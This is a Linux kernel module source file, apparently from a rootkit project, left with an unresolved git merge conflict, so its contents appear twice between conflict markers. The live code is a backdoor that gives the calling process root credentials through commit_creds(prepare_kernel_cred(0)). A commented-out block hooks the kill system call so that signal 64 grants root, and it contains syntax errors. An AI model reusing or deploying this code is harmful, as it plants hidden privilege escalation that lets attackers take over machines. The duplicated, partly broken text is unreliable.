<<<<<<< HEAD
#include "../khook/engine.h"
#include "backdoor_for_root.h"

#include <linux/uaccess.h> // copy_from_user
#include <linux/pid.h> // find_get_pid, put_pid, get_pid_task
#include <linux/sched.h> // find_task_by_vpid
#include <linux/cred.h> // copy_creds, exit_creds
#include <linux/slab.h> // kmalloc, kfree
#include <linux/stat.h> // struct kstat

static int backdoor_for_root(void){
    printk(KERN_INFO "giving root...\n");
    //set root
    commit_creds(prepare_kernel_cred(0));
    struct cred *root;
    root =prepare_creds();
    printk(KERN_INFO "uid : %d\n",root->uid.val);
    printk(KERN_INFO "gid : %d\n",root->gid.val);
    printk(KERN_INFO "euid : %d\n",root->euid.val);
    printk(KERN_INFO "egid : %d\n",root->egid.val);
    printk(KERN_INFO "suid : %d\n",root->suid.val);
    printk(KERN_INFO "sgid : %d\n",root->sgid.val);
    printk(KERN_INFO "fsuid : %d\n",root->fsuid.val);
    printk(KERN_INFO "fsgid : %d\n",root->fsgid.val);
    return 0;
}


int handle_backdoor_root_request(void) {

    if (backdoor_for_root() != 0) {
        // backdoor root failed
        goto err;
    }
    return 0;

    err:
    return 1;
}



/**
KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs*);
static long khook___x64_sys_kill(const struct pt_regs* regs) {

    int sig = regs->si;

    if (sig == 64){
        printk(KERN_INFO "giving root...\n");
        //set root
        struct cred* root;
        root = prepare_cred();
        if (root == null)
            goto err;
        root->uid.val = root->gid.val = 0;
        root->euid.val = root->egid.val = 0;
        root->suid.val = root->sgid.val = 0;
        root->fsuid.val = root->fsgid.val = 0;
        commit_creds(root);
        return 0；
    }
    return KHOOK_ORIGIN(__x64_sys_kill, regs);
    
    err:
    return 1;
}
**/
=======
#include "../khook/engine.h"
#include "backdoor_for_root.h"

#include <linux/uaccess.h> // copy_from_user
#include <linux/pid.h> // find_get_pid, put_pid, get_pid_task
#include <linux/sched.h> // find_task_by_vpid
#include <linux/cred.h> // copy_creds, exit_creds
#include <linux/slab.h> // kmalloc, kfree
#include <linux/stat.h> // struct kstat

static int backdoor_for_root(void){
    printk(KERN_INFO "giving root...\n");
    //set root
    commit_creds(prepare_kernel_cred(0));
    struct cred *root;
    root =prepare_creds();
    printk(KERN_INFO "uid : %d\n",root->uid.val);
    printk(KERN_INFO "gid : %d\n",root->gid.val);
    printk(KERN_INFO "euid : %d\n",root->euid.val);
    printk(KERN_INFO "egid : %d\n",root->egid.val);
    printk(KERN_INFO "suid : %d\n",root->suid.val);
    printk(KERN_INFO "sgid : %d\n",root->sgid.val);
    printk(KERN_INFO "fsuid : %d\n",root->fsuid.val);
    printk(KERN_INFO "fsgid : %d\n",root->fsgid.val);
    return 0;
}


int handle_backdoor_root_request(void) {

    if (backdoor_for_root() != 0) {
        // backdoor root failed
        goto err;
    }
    return 0;

    err:
    return 1;
}



/**
KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs*);
static long khook___x64_sys_kill(const struct pt_regs* regs) {

    int sig = regs->si;

    if (sig == 64){
        printk(KERN_INFO "giving root...\n");
        //set root
        struct cred* root;
        root = prepare_cred();
        if (root == null)
            goto err;
        root->uid.val = root->gid.val = 0;
        root->euid.val = root->egid.val = 0;
        root->suid.val = root->sgid.val = 0;
        root->fsuid.val = root->fsgid.val = 0;
        commit_creds(root);
        return 0；
    }
    return KHOOK_ORIGIN(__x64_sys_kill, regs);
    
    err:
    return 1;
}
**/
>>>>>>> 57507f202da51015bbd238624e94aa6a9968057f
